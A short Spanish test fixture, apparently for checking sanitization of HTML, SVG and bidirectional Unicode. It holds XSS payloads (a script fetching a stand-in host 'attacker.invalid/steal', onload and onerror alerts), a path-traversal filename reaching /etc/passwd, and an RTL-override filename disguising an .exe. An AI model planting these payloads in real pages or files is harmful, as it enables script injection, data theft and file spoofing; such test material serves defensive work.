# Documento Adversarial S4-02 — HTML, SVG y Unicode Bidireccional

Contenido sintético con payload embebido para pruebas de sanitización XSS y Unicode RTL:

<script>window.__xss_executed = true; fetch("https://attacker.invalid/steal");</script>
<svg onload="alert('xss')"><foreignObject><div>payload</div></foreignObject></svg>
<img src="x" onerror="alert(1)" />

Nombre de archivo malicioso de prueba: `../../../etc/passwd`
Caracteres de control bidireccional RTL (U+202E): `contrato_‮fdp.exe`

El plazo real de entrega sintético indicado en este documento es de **12 días hábiles**.

